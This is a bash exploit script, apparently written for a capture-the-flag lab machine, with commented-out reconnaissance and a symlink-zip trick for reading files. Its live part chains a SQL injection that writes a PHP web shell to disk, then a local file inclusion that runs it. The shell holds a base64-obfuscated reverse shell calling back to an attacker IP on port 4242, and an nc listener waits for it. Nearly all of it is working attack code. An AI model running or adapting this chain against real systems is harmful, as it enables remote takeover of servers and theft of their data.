#!/bin/bash

IP='10.10.11.229'
SEED=1

#echo -e "\033[1;32m>>> Run nmap as first test\033[0m"
#
#nmap $IP
#
#echo -e "\033[1;32m>>> Port 80 is open, IP can be open in web browser...\033[0m"
#echo -e "\033[1;32m>>> Run gobuster to scan the website urls\033[0m"
#
#gobuster dir -w /usr/share/wordlists/dir_cust.txt -x html,php -t 100 -u $IP -b 403,404
#
#echo -e "\033[1;32m>>> Further directory search in 'shop'\033[0m"
#
#gobuster dir -w /usr/share/wordlists/dir_cust.txt -x html,php -t 100 -u $IP/shop -b 403,404
#
#echo -e "\033[1;32m>>> upload.php page offers a possiblity to upload and check the content of a zipped file\033[0m"
#echo -e "\033[1;32m>>> This can be exploited by compressing a symbolic link\033[0m"
#echo -e "\033[1;32m>>> We can download all listed files (focus on cart.php and shop.php)\033[0m"

#mkdir downloads
#
#ln -s shop.php downloads/shop.pdf
#ln -s cart.php downloads/cart.pdf
#
#zip -q --symlinks downloads/shop.zip downloads/shop.pdf
#zip -q --symlinks downloads/cart.zip downloads/cart.pdf
#
#ls -la downloads
#
#0000   2d 2d 2d 2d 2d 2d 57 65 62 4b 69 74 46 6f 72 6d   ------WebKitForm
#0010   42 6f 75 6e 64 61 72 79 62 37 79 51 45 6f 34 6f   Boundaryb7yQEo4o
#0020   6f 57 61 7a 34 6f 67 73 0d 0a                     oWaz4ogs..
#
#'------WebKitFormBoundaryb7yQEo4ooWaz4ogs
#Content-Disposition: form-data; name="zipFile"; filename="$FILE"
#Content-Type: application/zip
#
#
#------WebKitFormBoundaryb7yQEo4ooWaz4ogs
#Content-Disposition: form-data; name="submit"
#
#
#------WebKitFormBoundaryb7yQEo4ooWaz4ogs--
#
#echo -e "\033[1;32m>>> Exploit files created...\033[0m"

#rm -rvf shop.php cart.php

curl "http://$IP/shop/index.php?page=cart" -vv -d "quantity=1&product_id=1%0a'; SELECT '<%3fphp exec(%22echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyLzQyNDIgMD4mMQo= |base64 -d|bash;%22); %3f>' into outfile '/var/lib/mysql/$SEED.php';--1" --cookie "PHPSESSID=o83g3sn1n8bh2ugr2ad8704s4s"

echo "step 1: OK"

(sleep 2; curl "http://$IP/shop/index.php?page=/var/lib/mysql/$SEED" --cookie "PHPSESSID=o83g3sn1n8bh2ugr2ad8704s4s") &

echo "step 2: OK"

nc -lvp 4242
